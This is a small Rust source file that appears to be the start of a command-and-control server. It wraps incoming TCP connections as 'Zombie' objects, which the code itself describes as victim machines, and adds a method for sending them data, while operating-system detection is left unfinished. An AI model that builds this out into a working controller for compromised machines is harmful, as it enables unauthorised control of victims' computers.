use std::fmt::Debug;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
use log::{debug, error, trace};

#[derive(Debug)]
pub enum System {
    Windows,
    Linux,
    MacOS,
    NotFound
}

/// Zombie is victim machine.
#[derive(Debug)]
pub struct Zombie {
    pub system: System,
    pub ip: IpAddr,
    pub port: u16,
    tcp_stream: TcpStream
}

/// TODO: Find system after connection
fn find_system(connection: &mut TcpStream) -> System {
    System::NotFound // Not implemented yet
}
impl Zombie {
    pub fn new(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
        Ok(
            Zombie {
                system: find_system(&mut connection),
                ip: connection.peer_addr()?.ip(),
                port: connection.peer_addr()?.port(),
                tcp_stream: connection
            }
        )
    }

    pub fn send_data(&mut self, data: &[u8]) {
        match self.tcp_stream.write(data) {
            Ok(size) => trace!("Writed {size} bytes!"),
            Err(e) => error!("Error writing to zombie!\n{e}")
        };
    }
}



pub fn craft_zombie(connection: TcpStream) -> Result<Zombie, std::io::Error> {
    debug!("Caught connection! {connection:?}");
    Zombie::new(connection)
}